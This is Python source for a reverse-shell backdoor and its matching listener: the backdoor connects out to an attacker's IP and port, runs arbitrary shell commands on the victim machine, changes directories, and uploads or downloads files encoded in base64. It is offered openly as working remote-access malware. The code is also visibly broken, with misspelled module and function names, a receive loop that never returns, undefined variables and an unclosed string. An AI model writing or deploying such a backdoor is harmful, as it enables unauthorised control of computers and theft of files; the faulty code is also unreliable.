import subprocess, socket, json, os, base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        
    def execute_system_command(self, command):
        try:
           return suprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "error during command execution"
            
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode())
    
    
    def reliable_receive(self):
        json_data = b""
        while True:
           try:
              json_data=json_data + self.connection.recv(1024)
              json.loads(json_data)
           except ValueError:
               continue
     
    def execute_remotely(self, command):
        self.reliable_send(command)
        result=self.reliable_receive()
    
    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def write_file(self, path, content):
         with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful" 
    
    def read_file(self,path):
        with open(path, 'rb') as file:
            return base64.b64encdoe(file.read()).decode()
    
    def run(self):
        while True:
            command=self.reliable_receive(1024)
            
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command)>1 :
                    self.change_working_directory_to(command[1])
                elif command[0] =='download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                     command_result = self.write_file(command[1], command[2])
                else:
                    command_result=self.execute_system_command(command).decode()
                self.reliable_send(command_result)
            except Exception:
                command_result = '[-] Error during command execution'



---------------------------------------------------

class Listener:
     def __init__(self):
        listener=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address=listener.accept()
        print("[+] Got a connection from ' + str(address))
     
     
     def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode())
        
     def reliable_receive(self):
         json_data = b""
         while True:
            try:
               json_data=json_data + self.connection.recv(1024)
               json.loads(json_data)
            except ValueError:
                continue
     
     def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0]=='exit':
            self.connection.close()
            exit()
        result=self.reliable_receive()
     
     def read_file(self,path):
        with open(path, 'rb') as file:
            return base64.b64encdoe(file.read())     
     
     def write_file(self, path, content):
         with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"
     
     def run(self):
        while True:
            command=input("Enter command: ")
            command=command.split(" ")
            result=self.execute_remotely(command)
            if command[0]=='download' and 'Error' not in result:
                result = self.write_file(command[1], result)
            if command[0]=='upload' and 'Error' not in result:
                file_content=self.read_file(command[1])
                command.append(file_content)
            print(result)
